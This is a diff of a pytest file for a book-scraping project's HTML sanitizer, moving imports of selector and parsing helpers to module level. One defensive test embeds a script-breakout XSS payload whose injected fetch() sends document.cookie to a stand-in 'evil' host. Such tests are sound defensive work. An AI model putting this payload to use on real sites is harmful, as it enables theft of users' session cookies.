@@ -13,16 +13,21 @@ import json
 import pytest
 
 from bookscraper.scraping import sanitize
+from bookscraper.scraping.parameters import site_constants
 from bookscraper.scraping.sanitize import (
     EMAIL_PLACEHOLDER,
     PROSE_PLACEHOLDER,
     REDACTED_VALUE,
     SanitizationError,
     _Element,
+    _element_siblings,
+    _iter_elements,
     _parse,
+    _select,
     _serialize,
     _split_group,
     _Text,
+    _text_content,
     assert_clean,
     neutralize_prose,
     sanitize_html,
@@ -1298,7 +1303,6 @@ def test_selector_combinators_and_attributes() -> None:
     On failure, first check:
         - A wrong result means a combinator or attribute rule in _select was changed; check the failing selector first.
     """
-    from bookscraper.scraping.sanitize import _select
 
     html = '<section id="s"><h1 class="a">A</h1><p class="b" data-role="lead">B</p><p class="c">C</p></section>'
     root = _parse(html)
@@ -1327,7 +1331,6 @@ def test_selector_star_and_attribute_value_mismatch() -> None:
     On failure, first check:
         - An unexpected empty result for '*' means the universal selector was accidentally disabled.
     """
-    from bookscraper.scraping.sanitize import _select
 
     root = _parse('<div><p data-role="lead">x</p></div>')
     assert any(e.tag == "p" for e in _select(root, "*"))
@@ -1349,7 +1352,6 @@ def test_element_siblings_orphan_returns_self() -> None:
     On failure, first check:
         - An empty list or an exception means the orphan path in _element_siblings was broken.
     """
-    from bookscraper.scraping.sanitize import _element_siblings
 
     orphan = _Element("p", [])
     assert _element_siblings(orphan) == [orphan]
@@ -1370,7 +1372,6 @@ def test_select_skips_empty_group() -> None:
     On failure, first check:
         - A raised exception means _select became stricter about trailing commas.
     """
-    from bookscraper.scraping.sanitize import _select
 
     root = _parse("<section><p>x</p></section>")
     assert [e.tag for e in _select(root, "p,")] == ["p"]
@@ -1491,7 +1492,6 @@ def test_selector_no_match_paths() -> None:
     On failure, first check:
         - A non-empty result means a selector that should not match is now matching spuriously.
     """
-    from bookscraper.scraping.sanitize import _select
 
     root = _parse('<div><p class="first">P</p></div>')
     # ".x + .first" : .first has no preceding sibling matching .x
@@ -1507,7 +1507,6 @@ def test_selector_no_match_paths() -> None:
 # --------------------------------------------------------------------------- #
 def _selector_values() -> list[tuple[str, str, str]]:
     """Return every real CSS selector in site_constants as (site, field, selector) tuples."""
-    from bookscraper.scraping.parameters import site_constants
 
     out: list[tuple[str, str, str]] = []
     for site, entry in site_constants.items():
@@ -1535,7 +1534,6 @@ def test_all_site_constants_selectors_parse() -> None:
     On failure, first check:
         - The raised selector is printed via the assert; find which site.field it belongs to and check for new syntax.
     """
-    from bookscraper.scraping.sanitize import _select
 
     root = _parse("<html><body></body></html>")
     for site, field, selector in _selector_values():
@@ -1559,8 +1557,6 @@ def test_has_text_disambiguates_packtpub_isbn() -> None:
     On failure, first check:
         - Multiple results mean the :has-text() clause was removed or changed in the packtpub ISBN13 selector.
     """
-    from bookscraper.scraping.parameters import site_constants
-    from bookscraper.scraping.sanitize import _select, _text_content
 
     html = (
         '<div class="product-page-rhs desktop">'
@@ -1589,8 +1585,6 @@ def test_has_text_disambiguates_oreilly_isbn() -> None:
     On failure, first check:
         - Multiple results mean the :has-text() clause was removed or changed in the oreilly ISBN13 selector.
     """
-    from bookscraper.scraping.parameters import site_constants
-    from bookscraper.scraping.sanitize import _select, _text_content
 
     html = (
         "<ul>"
@@ -1617,8 +1611,6 @@ def test_has_text_scopes_amazon_expander_group() -> None:
     On failure, first check:
         - 'Reviews' appearing in results means a :has-text() clause was widened or removed.
     """
-    from bookscraper.scraping.parameters import site_constants
-    from bookscraper.scraping.sanitize import _select, _text_content
 
     html = (
         '<a class="a-expander-header">Product details</a>'
@@ -1646,7 +1638,6 @@ def test_has_text_is_case_insensitive() -> None:
     On failure, first check:
         - An empty result means :has-text() was changed to case-sensitive comparison.
     """
-    from bookscraper.scraping.sanitize import _select
 
     root = _parse("<a>PRODUCT DETAILS</a>")
     assert len(_select(root, "a:has-text('product details')")) == 1
@@ -1667,7 +1658,6 @@ def test_unknown_pseudo_class_raises() -> None:
     On failure, first check:
         - A passing call means a pseudo-class was added to the supported set without test coverage.
     """
-    from bookscraper.scraping.sanitize import _select
 
     root = _parse("<div></div>")
     with pytest.raises(SanitizationError):
@@ -1689,7 +1679,6 @@ def test_pseudo_element_raises() -> None:
     On failure, first check:
         - A passing call means pseudo-element handling was silently added and the fail-closed contract was broken.
     """
-    from bookscraper.scraping.sanitize import _select
 
     with pytest.raises(SanitizationError):
         _select(_parse("<p></p>"), "p::before")
@@ -1710,7 +1699,6 @@ def test_has_text_without_parens_raises() -> None:
     On failure, first check:
         - A passing call means the :has-text parser was made more permissive about missing parentheses.
     """
-    from bookscraper.scraping.sanitize import _select
 
     with pytest.raises(SanitizationError):
         _select(_parse("<span></span>"), "span:has-text")
@@ -1731,7 +1719,6 @@ def test_has_text_unterminated_raises() -> None:
     On failure, first check:
         - A passing call means the :has-text parser was made lenient about unclosed parentheses.
     """
-    from bookscraper.scraping.sanitize import _select
 
     with pytest.raises(SanitizationError):
         _select(_parse("<a></a>"), "a:has-text('x'")
@@ -1752,7 +1739,6 @@ def test_has_text_regex_form_raises() -> None:
     On failure, first check:
         - A passing call means the regex form was accidentally added to the supported :has-text() variants.
     """
-    from bookscraper.scraping.sanitize import _select
 
     with pytest.raises(SanitizationError):
         _select(_parse("<a></a>"), "a:has-text(/x/)")
@@ -1773,7 +1759,6 @@ def test_attribute_operator_unsupported_raises() -> None:
     On failure, first check:
         - A passing call means an unsupported attribute operator was added without full test coverage.
     """
-    from bookscraper.scraping.sanitize import _select
 
     with pytest.raises(SanitizationError):
         _select(_parse("<a></a>"), "a[data-x~=b]")
@@ -1813,7 +1798,6 @@ def test_unsupported_character_raises() -> None:
     On failure, first check:
         - A passing call means the character was silently skipped, which may cause unexpected selector broadening.
     """
-    from bookscraper.scraping.sanitize import _select
 
     with pytest.raises(SanitizationError):
         _select(_parse("<a></a>"), "a%b")
@@ -1834,7 +1818,6 @@ def test_neutralize_prose_neutralizes_li_not_matching_has_text() -> None:
     On failure, first check:
         - Marketing prose surviving means the :has-text() keep-selector is over-protecting sibling elements.
     """
-    from bookscraper.scraping.parameters import site_constants
 
     long_prose = "This is a long marketing blurb about the book. " * 6
     html = f'<ul><li>{long_prose}</li><li>ISBN: <span class="value t-isbn">9780123456789</span></li></ul>'
@@ -1946,7 +1929,6 @@ def test_v3_ld_json_script_breakout_is_neutralized() -> None:
     On failure, first check:
         - A second script element or 'fetch(' in the output means the </script> encoding was removed from the re-embed path.
     """
-    from bookscraper.scraping.sanitize import _iter_elements
 
     ld = {"@type": "Book", "name": "X</script><script>fetch('//evil?c='+document.cookie)</script>"}
     # Realistic hostile source: the closing tag is JSON-escaped so the browser/parser
@@ -2051,7 +2033,6 @@ def test_v5_prose_chunked_into_sub_80_char_spans_is_neutralized() -> None:
     On failure, first check:
         - Surviving sentences mean the aggregate detection in V-5 re-fix was narrowed or the spans were also removed.
     """
-    from bookscraper.scraping.sanitize import _select
 
     sentence = "Each of these sentences is exactly sixty characters long okay!"  # ~60 chars
     assert len(sentence) < sanitize.PROSE_MIN_CHARS
@@ -2081,7 +2062,6 @@ def test_neutralize_prose_keeps_short_prose_heading_for_selector() -> None:
     On failure, first check:
         - A missing 'Book description' heading means the over-neutralization fix was reverted and the oreilly golden will fail.
     """
-    from bookscraper.scraping.sanitize import _select, _text_content
 
     body = "Long copyrighted description sentence that must be neutralized. " * 8
     html = (
@@ -2104,7 +2084,6 @@ def test_neutralize_prose_keeps_short_prose_heading_for_selector() -> None:
 
 def _keep_text_for(site: str) -> list[str]:
     """Return the detail CSS selectors for the given site, excluding description and URL/API keys."""
-    from bookscraper.scraping.parameters import site_constants
 
     skip = {"DESCRIPTION", "DESCRIPTION_ALT", "BASE_URL", "404_PAGE_TITLE"}
     out = []
@@ -2213,8 +2192,6 @@ def test_description_selectors_survive_sanitize_for_all_sites() -> None:
     On failure, first check:
         - A missing or wrong DESCRIPTION match means neutralization removed the element; check the site's keep-selectors.
     """
-    from bookscraper.scraping.parameters import site_constants
-    from bookscraper.scraping.sanitize import _select, _text_content
 
     for site, spec in _SITE_DESCRIPTION_MARKUP.items():
         keep_text = _keep_text_for(site)
